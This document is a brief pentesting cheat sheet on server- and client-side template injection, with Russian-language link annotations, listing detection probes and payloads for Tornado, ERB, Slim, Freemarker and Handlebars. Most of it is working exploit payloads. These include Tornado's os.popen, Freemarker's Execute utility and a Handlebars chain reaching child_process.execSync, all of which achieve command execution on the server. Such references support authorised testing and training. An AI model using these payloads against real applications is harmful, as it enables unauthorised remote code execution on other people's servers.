# SSTI/CSTI

Flask & Jinja2 [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

Template Injection Workshop (по сути, примеры, как это работает в python, php, java,..): [https://gosecure.github.io/template-injection-workshop/#0](https://gosecure.github.io/template-injection-workshop/#0)

Норм описание для h1 для CSTI: [https://hackerone.com/reports/125027](https://hackerone.com/reports/125027)

## Python

### Tornado

Link: [https://www.tornadoweb.org/en/stable/](https://www.tornadoweb.org/en/stable/)

Basic:

```python
{{ 2*2 }}
{% raw %}
{% import subprocess %}
{% import os %}
{% endraw %}{{ os.popen("whoami").read() }}
```

## Ruby

### ERB

Link: [https://puppet.com/docs/puppet/5.5/lang\_template\_erb.html](https://puppet.com/docs/puppet/5.5/lang\_template\_erb.html)

Basic:

```ruby
<%= 7 * 7 %>
```

### Slim

Link: [https://github.com/slim-template/slim](https://github.com/slim-template/slim)

Basic:

```ruby
#{ 7 * 7 }
```

## Java

### Freemarker

Link:[ https://try.freemarker.apache.org/](https://try.freemarker.apache.org/)

Basic:

```java
// Code Execution — id:
${"freemarker.template.utility.Execute"?new()("id")}
```

## JavaScript

### Handlebars

Link: [https://handlebarsjs.com/](https://handlebarsjs.com/)

Basic:

```javascript
${{7*7}} -> OK
${{7*'7'}} -> Empty
```

RCE (from [payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars)):

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
